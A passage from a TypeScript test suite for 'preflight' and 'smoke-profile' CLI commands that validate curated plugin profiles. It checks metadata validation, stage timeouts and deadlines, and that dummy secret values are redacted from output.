            message: 'active curated entry must declare candidateId or have a string entry id/name fallback',
          },
          {
            code: 'preflight-curated-capability-missing',
            target: 'incomplete',
            message: 'active curated entry must declare a capability',
          },
        ],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects invalid active curated metadata before profile conflict checks', () => {
    const path = tempFile('patch.yml', `- id: invalid-candidate
  config:
    curated:
      candidateId: 3
      active: true
      capability: web-search
      resources: []
- id: invalid-profile
  config:
    curated:
      candidateId: explicit-candidate
      profile: 7
      active: true
      capability: web-search
- config:
    curated:
      candidateId: 4
      profile: 5
      active: true
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { entryCount: number; issues: Array<{ code: string; target?: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.entryCount).toBe(3)
      expect(payload.issues).toHaveLength(7)
      expect(payload.issues).toEqual(expect.arrayContaining([
        {
          code: 'preflight-curated-candidate-id-invalid',
          target: 'invalid-candidate',
          message: 'active curated candidateId must be a non-empty string',
        },
        {
          code: 'preflight-curated-candidate-id-invalid',
          message: 'active curated candidateId must be a non-empty string',
        },
        {
          code: 'preflight-curated-candidate-id-missing',
          message: 'active curated entry must declare candidateId or have a string entry id/name fallback',
        },
        {
          code: 'preflight-curated-capability-missing',
          message: 'active curated entry must declare a capability',
        },
        {
          code: 'preflight-curated-profile-invalid',
          target: 'explicit-candidate',
          message: 'active curated profile must be a non-empty string',
        },
        {
          code: 'preflight-curated-profile-invalid',
          message: 'active curated profile must be a non-empty string',
        },
        {
          code: 'preflight-curated-resources-invalid',
          target: 'invalid-candidate',
          message: 'active curated resources must be a map',
        },
      ]))
    } finally {
      cleanup(path)
    }
  })

  it('rejects malformed active curated resource claims', () => {
    const path = tempFile('patch.yml', `- name: plugin-a
  config:
    curated:
      profile: web-curated
      active: true
      capability: web-search
      resources:
        toolNames: [""]
        commandNames: command
        ports: [3000]
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: false,
        entryCount: 1,
        issues: [
          {
            code: 'preflight-curated-resource-list-invalid',
            target: 'plugin-a',
            message: 'active curated resources.commandNames must be a list of non-empty strings',
          },
          {
            code: 'preflight-curated-resource-value-invalid',
            target: 'plugin-a',
            message: 'active curated resources.ports[0] must be a non-empty string',
          },
          {
            code: 'preflight-curated-resource-value-invalid',
            target: 'plugin-a',
            message: 'active curated resources.toolNames[0] must be a non-empty string',
          },
        ],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects unsupported arguments after redacting secret-like values', () => {
    const result = runPreflight(['--api-key=sk-unsupported-secret'])

    expect(result.status).toBe(1)
    expect(result.stdout).toContain('preflight-input-invalid')
    expect(result.stdout).toContain('[REDACTED]')
    expect(result.stdout).not.toContain('sk-unsupported-secret')
  })

  it.each(['--password', '--api-key', '--token'])('redacts ordinary values supplied through %s', (flag) => {
    const secret = 'ordinary-value-7391'
    const result = runPreflight([`${flag}=${secret}`])

    expect(result.status).toBe(1)
    expect(result.stdout).toContain(`${flag}=[REDACTED]`)
    expect(result.stdout).not.toContain(secret)
  })

  it('scans secret-named values nested under curated metadata', () => {
    const path = tempFile('patch.yml', `- id: curated-secret
  name: plugin-a
  config:
    curated:
      candidateId: plugin-a
      profile: web-curated
      active: false
      capability: web-search
      token: ordinary-curated-secret
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-config-secret',
        target: 'curated-secret',
      }))
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-curated-key-unknown',
      }))
      expect(result.stdout).not.toContain('ordinary-curated-secret')
    } finally {
      cleanup(path)
    }
  })

  it.each([true, false])('rejects unknown curated metadata keys when active is %s', (active) => {
    const path = tempFile('patch.yml', `- id: curated-unknown
  name: dsh-web-search-pro
  config:
    curated:
      candidateId: dsh-web-search-pro
      profile: web-curated
      active: ${String(active)}
      capability: web-search
      unexpected: value
      resources:
        unknownResource: [value]
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual(expect.arrayContaining([
        {
          code: 'preflight-curated-key-unknown',
          message: 'curated metadata contains unknown key unexpected',
        },
        {
          code: 'preflight-curated-resource-key-unknown',
          message: 'curated resources contain unknown key unknownResource',
        },
      ]))
    } finally {
      cleanup(path)
    }
  })
})

describe('smoke-profile command', () => {
  it('rejects rootless smoke instead of staging a synthesized profile', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      observed: false,
      issues: [{ code: 'smoke-profile-profile-root-required' }],
    })
  })

  it('loads and disposes an observable fixture service through the installed resolver', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-observable-home-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      private: true,
      dsh: { profile: { bundles: ['@deepseek-ai/dsh-toolkit'] } },
    }))
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), '[]\n')
    stageCandidatePackage(
      profileRoot,
      '@deepseek-ai/dsh-toolkit',
      `- insert:
    - id: observable-fixture
      name: '@deepseek-ai/dsh-toolkit'
`,
      {},
      [
        'export const name = "observable-fixture"',
        'export const inject = []',
        'export function apply(ctx) {',
        '  ctx.effect(() => ctx.provide("curatedFixtureService", Object.freeze({ live: true })), "fixture service")',
        '}',
        '',
      ].join('\n'),
    )
    const events: string[] = []
    try {
      const result = await runSmokeProfile([
        '--profile',
        'web-curated',
        '--profile-root',
        profileRoot,
        '--artifact-root',
        profileRoot,
        '--json',
      ], {
        profiles: { 'web-curated': { bundles: ['@deepseek-ai/dsh-toolkit'] } },
        runner: async (request: SmokeProfileRunnerRequest) => {
          if (request.stage === 'dump-config') {
            const profile = loadProfile(
              'curated-fixture',
              'web-curated',
              join(profileRoot, 'package.json'),
              home,
            )
            const configPath = join(profileRoot, 'composed.cordis.json')
            writeFileSync(configPath, JSON.stringify(composeEntries([
              ...profile.layers.map(layer => layer.patches),
              profile.patches,
            ])))
            const ctx = await boot(
              'curated-fixture',
              configPath,
              undefined,
              undefined,
              pathToFileURL(join(profileRoot, 'package.json')).href,
            )
            events.push(ctx.get('curatedFixtureService') === undefined ? 'missing' : 'registered')
            await ctx.fiber.dispose()
            events.push(ctx.get('curatedFixtureService') === undefined ? 'disposed' : 'retained')
          }
          return { status: 0, stdout: '', stderr: '', durationMs: 1 }
        },
      })

      expect(result.status).toBe(0)
      expect(events).toEqual(['registered', 'disposed'])
      expect(existsSync(join(profileRoot, 'noop-plugin.mjs'))).toBe(false)
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('declares shipped wrappers as package bins', () => {
    const manifest = JSON.parse(readFileSync(join(packageRoot, 'package.json'), 'utf8')) as {
      readonly bin?: Record<string, string>
    }

    expect(manifest.bin).toEqual({
      'dsh-curated-verify-lock': 'lib/bin.js',
      'dsh-curated-preflight': 'lib/bin.js',
      'dsh-curated-smoke-profile': 'lib/bin.js',
      'dsh-curated-compare-benchmark': 'lib/bin.js',
    })
  })

  it('uses an installed profile root and never creates a no-op bundle shim', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-installed-home-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      private: true,
      dsh: { profile: { bundles: ['@deepseek-ai/dsh-toolkit'] } },
    }))
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), '[]\n')
    stageCandidatePackage(profileRoot, '@deepseek-ai/dsh-toolkit')
    const globalState = globalThis as typeof globalThis & { __dshCuratedArtifactLoads?: number }
    try {
      delete globalState.__dshCuratedArtifactLoads
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: {
          'web-curated': {
            bundles: ['@deepseek-ai/dsh-toolkit'],
          },
        },
        profileRoot,
        artifactRoots: [profileRoot],
        artifactResolver: createInstalledArtifactResolver([profileRoot]),
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })

      expect(result.status).toBe(0)
      expect(globalState.__dshCuratedArtifactLoads).toBe(1)
      expect(existsSync(join(profileRoot, 'noop-plugin.mjs'))).toBe(false)
    } finally {
      delete globalState.__dshCuratedArtifactLoads
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('fails closed for installed candidate artifact inconsistencies', async () => {
    const cases = [
      {
        name: 'package name does not match the catalog',
        manifest: { name: 'other-package' },
      },
      {
        name: 'bundle patch does not match the catalog',
        manifest: { dsh: { bundle: { patch: './other.patch.yml' } } },
      },
      {
        name: 'package main entry is missing',
        manifest: { main: undefined },
      },
      {
        name: 'package main entry is not built',
        manifest: { main: './missing.mjs' },
      },
      {
        name: 'module load failed',
        pluginSource: 'throw new Error("sk-module-load-secret")\n',
      },
    ] as const
    for (const testCase of cases) {
      const home = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-invalid-'))
      const profileRoot = join(home, 'profiles', 'web-curated')
      mkdirSync(profileRoot, { recursive: true })
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['@deepseek-ai/dsh-toolkit'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        '@deepseek-ai/dsh-toolkit',
        undefined,
        testCase.manifest ?? {},
        testCase.pluginSource,
      )
      try {
        const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
          profiles: { 'web-curated': { bundles: ['@deepseek-ai/dsh-toolkit'] } },
          profileRoot,
          artifactRoots: [profileRoot],
          runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
        })

        expect(result.status, testCase.name).toBe(1)
        expect(JSON.parse(result.stdout), testCase.name).toMatchObject({
          issues: [{ code: 'smoke-profile-input-invalid' }],
        })
        expect(result.stdout).toContain(testCase.name)
        expect(result.stdout).not.toContain('sk-module-load-secret')
      } finally {
        rmSync(home, { recursive: true, force: true })
      }
    }
  })

  it('rejects missing installed patches, bundle mismatches, and unresolved candidates', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-resolution-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['other-bundle'] } },
      }))
      let result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['@deepseek-ai/dsh-toolkit'] } },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })
      expect(result.stdout).toContain('bundle list does not match')

      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['@deepseek-ai/dsh-toolkit'] } },
      }))
      result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['@deepseek-ai/dsh-toolkit'] } },
        profileRoot,
        artifactResolver: { resolve: () => undefined },
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })
      expect(result.stdout).toContain('package is not installed or resolvable')

      const packageDir = stageCandidatePackage(profileRoot, '@deepseek-ai/dsh-toolkit')
      unlinkSync(join(packageDir, 'cordis.patch.yml'))
      result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['@deepseek-ai/dsh-toolkit'] } },
        profileRoot,
        artifactRoots: [profileRoot],
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })
      expect(result.stdout).toContain('bundle patch is missing')
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('rejects invalid installed candidate metadata before artifact loading', async () => {
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      const catalog = actual.loadCuratedCatalog()
      const candidate = catalog.candidates[0]!
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          ...catalog,
          candidates: [
            { ...candidate, id: 'inactive', expectedPackage: 'inactive', active: false },
            { ...candidate, id: 'wrong-profile', expectedPackage: 'wrong-profile', targetProfiles: [] },
            { ...candidate, id: 'missing-manifest', expectedPackage: 'missing-manifest', manifestPath: null },
            { ...candidate, id: 'missing-patch', expectedPackage: 'missing-patch', bundlePatch: null },
            { ...candidate, id: 'unsafe-patch', expectedPackage: 'unsafe-patch', bundlePatch: '../patch.yml' },
          ],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-metadata-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    try {
      const cases = [
        ['inactive', 'must be active for profile'],
        ['wrong-profile', 'must be active for profile'],
        ['missing-manifest', 'must declare package manifest and bundle patch metadata'],
        ['missing-patch', 'must declare package manifest and bundle patch metadata'],
        ['unsafe-patch', 'must declare a safe relative bundle patch path'],
      ] as const
      for (const [packageName, message] of cases) {
        writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
          dsh: { profile: { bundles: [packageName] } },
        }))
        const result = await commands.runSmokeProfile(['--profile', 'web-curated', '--json'], {
          profiles: { 'web-curated': { bundles: [packageName] } },
          profileRoot,
          artifactResolver: { resolve: () => undefined },
          runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
        })

        expect(result.status, packageName).toBe(1)
        expect(result.stdout, packageName).toContain(message)
      }
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('uses the installed runner and contains profile loading failures', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-installed-runner-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      dsh: { profile: { bundles: ['fixture-local-bundle'] } },
    }))
    stageCandidatePackage(profileRoot, 'fixture-local-bundle')
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), 'invalid: patch\n')
    try {
      const result = await runSmokeProfile([`--profile-root=${profileRoot}`, '--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['fixture-local-bundle'] } },
      })

      expect(result.status).toBe(1)
      const payload = JSON.parse(result.stdout) as SmokeProfileReport
      expect(payload.issues).toContainEqual({
        code: 'smoke-profile-stage-failed',
        target: 'dump-config',
        message: 'stage dump-config exited with status 1',
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('emits staged JSON for a valid profile without starting a server', async () => {
    const observed: string[] = []
    const runner: SmokeProfileRunner = async (request: SmokeProfileRunnerRequest) => {
      expect(Number.isInteger(request.timeoutMs)).toBe(true)
      expect(request.timeoutMs).toBeGreaterThan(0)
      expect(request.timeoutMs).toBeLessThanOrEqual(55_000)
      observed.push(`${request.stage}:${request.profile}`)
      return { status: 0, stdout: `${request.stage} ok`, stderr: '', durationMs: 7 }
    }

    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], { runner })

    expect(result.status).toBe(0)
    expect(JSON.parse(result.stdout)).toEqual({
      command: 'smoke-profile',
      ok: true,
      observed: false,
      profile: 'web-curated',
      timeLimitMs: 55000,
      stages: [
        { name: 'manifest', ok: true, durationMs: 0 },
        { name: 'bundle-parse', ok: true, durationMs: 0 },
        { name: 'dump-config', ok: true, durationMs: 7, status: 0 },
        { name: 'help', ok: true, durationMs: 7, status: 0 },
      ],
      issues: [],
    })
    expect(observed).toEqual([
      'dump-config:web-curated',
      'help:web-curated',
    ])
  })

  it('smokes the shipped web and headless profiles through the same staged checks', async () => {
    const observed: string[] = []
    const runner: SmokeProfileRunner = async (request: SmokeProfileRunnerRequest) => {
      observed.push(`${request.stage}:${request.profile}:${request.bundles?.join(',')}`)
      return { status: 0, stdout: `${request.stage} ok`, stderr: '', durationMs: 5 }
    }

    const web = await runSmokeProfile(['--profile', 'web', '--json'], { runner })
    const headless = await runSmokeProfile(['--profile', 'headless', '--json'], { runner })

    expect(web.status).toBe(0)
    expect(headless.status).toBe(0)
    expect(JSON.parse(web.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: true,
      profile: 'web',
    })
    expect(JSON.parse(headless.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: true,
      profile: 'headless',
    })
    expect(observed).toEqual([
      'dump-config:web:@deepseek-ai/dsh-base,@deepseek-ai/dsh-web-app',
      'help:web:@deepseek-ai/dsh-base,@deepseek-ai/dsh-web-app',
      'dump-config:headless:@deepseek-ai/dsh-base,@deepseek-ai/dsh-headless',
      'help:headless:@deepseek-ai/dsh-base,@deepseek-ai/dsh-headless',
    ])
  })

  it('renders text success when injected child checks pass', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated'], {
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result).toEqual({
      status: 0,
      stdout: 'smoke-profile: ok (profile web-curated)\n',
      stderr: '',
    })
  })

  it('rejects a profile template with no bundles', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      profiles: { 'web-curated': { bundles: [] } },
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      profile: 'web-curated',
      issues: [{ code: 'smoke-profile-bundle-missing', target: 'web-curated' }],
    })
  })

  it('rejects a profile template whose bundle list is not an array', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      profiles: { 'web-curated': {} },
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [{ code: 'smoke-profile-bundle-missing' }],
    })
  })

  it('rejects empty bundle names in text mode', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated'], {
      profiles: { 'web-curated': { bundles: [''] } },
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result.status).toBe(1)
    expect(result.stdout).toContain('smoke-profile: failed (profile web-curated, 1 issues)')
    expect(result.stdout).toContain('smoke-profile-bundle-invalid web-curated')
  })

  it('rejects session-export all bundles and second plugin managers', async () => {
    const result = await runSmokeProfile(['--profile', 'web-enterprise', '--json'], {
      profiles: { 'web-enterprise': { bundles: ['@deepseek-ai/dsh-curated-base', 'dsh-suite', 'dsh-mcp-manager'] } },
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [
        { code: 'smoke-profile-plugin-manager-duplicate', target: 'web-enterprise' },
        { code: 'smoke-profile-session-export-all-bundle', target: 'web-enterprise' },
      ],
    })
  })

  it('runs child checks when a profile omits the curated-base bundle', async () => {
    const observed: string[] = []
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      profiles: { 'web-curated': { bundles: ['plugin-a'] } },
      runner: async (request: SmokeProfileRunnerRequest) => {
        observed.push(request.stage)
        return { status: 0, stdout: '', stderr: '', durationMs: 2 }
      },
    })

    expect(result.status).toBe(0)
    expect(observed).toEqual(['dump-config', 'help'])
  })

  it('rejects an unknown or invalid profile before running child checks', async () => {
    let calls = 0
    const result = await runSmokeProfile(['--profile', '../bad', '--json'], {
      runner: async () => {
        calls += 1
        return { status: 0, stdout: '', stderr: '', durationMs: 1 }
      },
    })

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [{ code: 'smoke-profile-profile-invalid' }],
    })
    expect(calls).toBe(0)
  })

  it('records non-zero child process results as stage failures', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      runner: async (request: SmokeProfileRunnerRequest) => request.stage === 'dump-config'
        ? { status: 2, stdout: '', stderr: 'dump failed', durationMs: 4 }
        : { status: 0, stdout: '', stderr: '', durationMs: 4 },
    })

    const payload = JSON.parse(result.stdout) as SmokeProfileReport
    expect(result.status).toBe(1)
    expect(payload.stages).toContainEqual({
      name: 'dump-config',
      ok: false,
      durationMs: 4,
      status: 2,
      error: 'dump failed',
    })
    expect(payload.issues).toContainEqual({
      code: 'smoke-profile-stage-failed',
      target: 'dump-config',
      message: 'stage dump-config exited with status 2',
    })
  })

  it('enforces the 55 second command limit and reports timeout by stage', async () => {
    let helpTimeout = 0
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      runner: async (request: SmokeProfileRunnerRequest) => {
        expect(Number.isInteger(request.timeoutMs)).toBe(true)
        if (request.stage === 'help') helpTimeout = request.timeoutMs
        return request.stage === 'help'
          ? { status: 124, stdout: '', stderr: '', durationMs: request.timeoutMs, timedOut: true }
          : { status: 0, stdout: '', stderr: '', durationMs: 3 }
      },
    })

    const payload = JSON.parse(result.stdout) as SmokeProfileReport
    expect(result.status).toBe(1)
    expect(payload.stages).toContainEqual({
      name: 'help',
      ok: false,
      durationMs: helpTimeout,
      status: 124,
      error: `stage timed out after ${String(helpTimeout)} ms`,
    })
    expect(payload.issues).toContainEqual({
      code: 'smoke-profile-stage-timeout',
      target: 'help',
      message: `stage timed out after ${String(helpTimeout)} ms`,
    })
  })

  it('does not trust runner-reported duration for the aggregate deadline', async () => {
    const observed: string[] = []
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      runner: async (request: SmokeProfileRunnerRequest) => {
        observed.push(request.stage)
        return { status: 0, stdout: '', stderr: '', durationMs: request.timeoutMs }
      },
    })

    const payload = JSON.parse(result.stdout) as SmokeProfileReport
    expect(result.status).toBe(0)
    expect(observed).toEqual(['dump-config', 'help'])
    expect(payload.issues).toEqual([])
  })

  it('uses elapsed wall time instead of summed runner durations', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      runner: async (request: SmokeProfileRunnerRequest) => request.stage === 'dump-config'
        ? { status: 0, stdout: '', stderr: '', durationMs: 54999 }
        : { status: 0, stdout: '', stderr: '', durationMs: 2 },
    })

    const payload = JSON.parse(result.stdout) as SmokeProfileReport
    expect(result.status).toBe(0)
    expect(payload.issues).toEqual([])
  })

  it('uses monotonic elapsed time when a runner understates its duration', async () => {
    const observed: string[] = []
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      timeLimitMs: 10,
      runner: async (request: SmokeProfileRunnerRequest) => {
        observed.push(request.stage)
        await new Promise(resolve => setTimeout(resolve, 25))
        return { status: 0, stdout: '', stderr: '', durationMs: 1 }
      },
    })
    const payload = JSON.parse(result.stdout) as SmokeProfileReport

    expect(result.status).toBe(1)
    expect(observed).toEqual(['dump-config'])
    expect(payload.issues).toContainEqual({
      code: 'smoke-profile-command-timeout',
      target: 'dump-config',
      message: 'smoke-profile budget exhausted during dump-config',
    })
  })

  it('includes staging in the monotonic command deadline', async () => {
    const observed: string[] = []
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      timeLimitMs: 10,
      prepare: async () => {
        await new Promise(resolve => setTimeout(resolve, 25))
      },
      runner: async (request: SmokeProfileRunnerRequest) => {
        observed.push(request.stage)
        return { status: 0, stdout: '', stderr: '', durationMs: 1 }
      },
    })
    const payload = JSON.parse(result.stdout) as SmokeProfileReport

    expect(result.status).toBe(1)
    expect(observed).toEqual([])
    expect(payload.issues).toContainEqual({
      code: 'smoke-profile-command-timeout',
      target: 'manifest',
      message: 'smoke-profile budget exhausted during staging',
    })
  })

  it('fails before and immediately after child stages when the wall deadline expires', async () => {
    const before = vi.spyOn(performance, 'now')
      .mockReturnValueOnce(0)
      .mockReturnValueOnce(2)
    const beforeResult = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      timeLimitMs: 1,
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
    })
    before.mockRestore()
    expect(JSON.parse(beforeResult.stdout)).toMatchObject({
      issues: [{ message: 'smoke-profile budget exhausted before dump-config' }],
    })

    const during = vi.spyOn(performance, 'now')
      .mockReturnValueOnce(0)
      .mockReturnValueOnce(0)
      .mockReturnValueOnce(2)
    const duringResult = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      timeLimitMs: 1,
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
    })
    during.mockRestore()
    expect(JSON.parse(duringResult.stdout)).toMatchObject({
      issues: [{ message: 'smoke-profile budget exhausted during dump-config' }],
    })

    const after = vi.spyOn(performance, 'now')
      .mockReturnValueOnce(0)
      .mockReturnValueOnce(0)
      .mockReturnValueOnce(0)
      .mockReturnValueOnce(2)
    const afterResult = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      timeLimitMs: 1,
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
    })
    after.mockRestore()
    expect(JSON.parse(afterResult.stdout)).toMatchObject({
      issues: [{ message: 'smoke-profile budget exhausted after dump-config' }],
    })
  })

  it('returns a staging timeout before inspection when no budget remains', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-staging-timeout-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      dsh: { profile: { bundles: ['@deepseek-ai/dsh-toolkit'] } },
    }))
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['@deepseek-ai/dsh-toolkit'] } },
        profileRoot,
        timeLimitMs: 0,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
      })

      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        issues: [{ message: 'smoke-profile budget exhausted during staging' }],
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('runs through the smoke-profile source-tree wrapper', () => {
    const result = runNode('smoke-profile.mjs', ['--profile', 'web-curated', '--json'])
    const payload = JSON.parse(result.stdout) as SmokeProfileReport

    expect(result.status).toBe(1)
    expect(payload).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      observed: false,
      profile: 'web-curated',
      issues: [{ code: 'smoke-profile-profile-root-required' }],
    })
  }, 20_000)

  it('contains and redacts provider-interface faults while preserving single-plugin recovery', async () => {
    const harness = await bootCuratedBehaviorProfile()
    const cases = [
      ['search-timeout', 'dsh-web-search-pro'],
      ['provider-429', 'dsh-llm-fallbacks'],
      ['sqlite-lock', 'dsh-memento'],
      ['permission-denied-file', 'dsh-permission-rules'],
      ['offline-network', 'upstream-radar'],
      ['illegal-patch', 'fixture-illegal-patch'],
      ['initialization-exception', 'dsh-agent-team-gui'],
    ] as const
    try {
      for (const [fault, candidateId] of cases) {
        let events: readonly string[] = []
        const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
          profiles: {
            'web-curated': {
              bundles: [
                '@deepseek-ai/dsh-curated-base',
                '@deepseek-ai/dsh-curated-behavior-fixture',
              ],
            },
          },
          runner: async (request: SmokeProfileRunnerRequest) => {
            if (request.stage === 'help') {
              return { status: 0, stdout: 'help ok', stderr: '', durationMs: 1 }
            }
            const execution = await harness.fixture().run(fault)
            events = execution.events
            return {
              status: execution.result.isError ? 1 : 0,
              stdout: '',
              stderr: execution.result.content.map((block: CuratedFixtureContentBlock) => block.type === 'text' ? block.text : '').join('\n'),
              durationMs: 1,
            }
          },
        })

        const payload = JSON.parse(result.stdout) as SmokeProfileReport
        const failedStage = payload.stages.find(item => item.name === 'dump-config')
        expect(result.status).toBe(1)
        expect(payload.ok).toBe(false)
        expect(failedStage).toMatchObject({
          name: 'dump-config',
          ok: false,
          durationMs: 1,
          status: 1,
        })
        expect(failedStage?.error).toContain(`candidate ${candidateId}`)
        expect(failedStage?.error).toContain('stage')
        expect(failedStage?.error).toContain('[REDACTED]')
        expect(failedStage?.error).not.toContain('sk-')
        expect(events).toEqual(expect.arrayContaining(['tool/call', 'tool/result']))
        await expect(harness.fixture().run('success')).resolves.toMatchObject({
          result: { isError: false },
        })
      }
    } finally {
      await harness.ctx.fiber.dispose()
    }
  })

  it('fails closed on an illegal patch fixture without echoing secret material', () => {
    const path = tempFile('patch.yml', `- id: bad
  name: plugin-a
  config:
    apiKey: sk-illegal-patch-secret
    value: [unclosed
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as {
        ok: boolean
        issues: Array<{ code: string; message: string }>
      }

      expect(result.status).toBe(1)
      expect(payload.ok).toBe(false)
      expect(payload.issues).toHaveLength(1)
      expect(payload.issues[0]?.code).toBe('preflight-input-invalid')
      expect(payload.issues[0]?.message).toContain('curated patch cannot be loaded')
      expect(JSON.stringify(payload)).toContain('[REDACTED]')
      expect(JSON.stringify(payload)).not.toContain('sk-illegal-patch-secret')
    } finally {
      cleanup(path)
    }
  })

  it('reports argument parsing failures from smoke-profile as JSON', async () => {
    const result = await runSmokeProfile(['--profile', '', '--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
